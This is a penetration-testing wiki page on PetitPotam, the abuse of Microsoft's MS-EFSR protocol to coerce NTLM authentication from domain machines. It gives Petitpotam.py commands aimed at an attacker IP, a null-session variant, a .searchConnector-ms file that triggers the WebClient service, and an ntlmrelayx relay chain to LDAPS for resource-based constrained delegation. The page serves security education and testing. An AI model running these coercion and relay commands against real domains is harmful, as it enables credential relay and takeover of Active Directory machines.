# MS-EFSR abuse \(PetitPotam\)

## Theory

MS-EFSR is Microsoft's Encrypting File System Remote protocol. It performs maintenance and management operations on encrypted data that is stored remotely and accessed over a network \([docs.microsoft.com](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr)\) and is available as an RPC interface. That interface is available through the `\pipe\efsrpc`, `\pipe\lsarpc`, `\pipe\samr`, `\pipe\lsass` and `\pipe\netlogon` SMB named pipes.

In 2019, Google's Project Zero research team found and reported a bug on MS-EFSR that could be combined with a [NTLM Reflection attack](https://bugs.chromium.org/p/project-zero/issues/detail?id=222) leading to a Local Privilege Elevation. An insufficient path check in MS-EFSR's `EfsRpcOpenFileRaw` method allowed attackers to force the `SYSTEM` account into creating an executable file of the attacker's choosing, hence providing the attacker with local admin rights.

While the wider implications of this bug, AD-DS-wise, were only suspected, in 2021, [Gilles LIONEL](https://twitter.com/topotam77/status/1416833996923809793) used that bug to remotely coerce domain-joined machine's authentication.

{% hint style="warning" %}
At the time of writing \(08/11/2021\), this bug has not been [fully addressed](https://blog.0patch.com/2021/08/free-micropatches-for-petitpotam.html) by Microsoft.
{% endhint %}

## Practice

An authentication can be forced with the original author's proof-of-concepts dubbed "[PetitPotam](https://github.com/topotam/PetitPotam)" \(available in C and Python\) by using a valid AD account's credentials.

```bash
Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
```

{% hint style="info" %}
**Nota bene**: the coerced NTLM authentication will be made through SMB. This is important because it restricts the possibilites of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMBv2 to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
{% endhint %}

{% hint style="success" %}
Some tests conducted in lab environments showed that, unlike the [MS-RPRN abuse \(printbug\)](ms-rprn.md), a NULL session could potentially be used to trigger that bug \(if allowed by the target\). This has only been verified to be working on on Windows Server 2016 and Windows Server 2019 Domain Controllers.

```bash
Petitpotam.py $ATTACKER_IP $TARGET_IP
```
{% endhint %}

###  Webclient

The goal of the attack is to relay an http connection to a ldap service. A summary of cross-protocols NTLMv2 relay attacks is available on [Relay documentation](../ntlm/relay.md#theory).

On specific conditions, the coerced NTLM authentication could be used to impersonate a machine account and execute a [Resource-Based Constrained Delegation](../kerberos/delegations/rbcd.md). The conditions are:
- The Webclient service should be started, it could be checked with [WebclientServiceScanner](https://github.com/Hackndo/WebclientServiceScanner/). The service could be triggered through a `.searchConnector-ms` file dropped on a share folder. If a user browse the directory the webclient service will start automatically.

```
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
```

- To retrieve an authenticated connection the attacker should be considered in the intranet zone. One way to do it, is to use the Netbios name of the attacker machine.
- LDAP signing/channel-binding must be disabled (this is the default).
- Valid credentials or an existing connection to the target machine (e.g., a previous coerce authentication with PetitPotam)

1. Start ntlmrelay: `ntlmrelayx.py -t ldaps://pentest.lab --delegate-access`
2. Coerce the authentication: `python Petitpotam.py -u "login" -p "password" -d "pentest.lab" <netbios name of attacker machine>@80/whatever.txt <target machine>`
3. Once the webdav connection has been relayed a new computer account will be created with the delegation rights configured.

## Resources

{% embed url="https://www.exploit-db.com/exploits/47115" %}

{% embed url="https://github.com/topotam/PetitPotam" %}

{% embed url="https://pentestlab.blog/2021/10/20/lateral-movement-webclient/" %}

{% embed url="https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb" %}

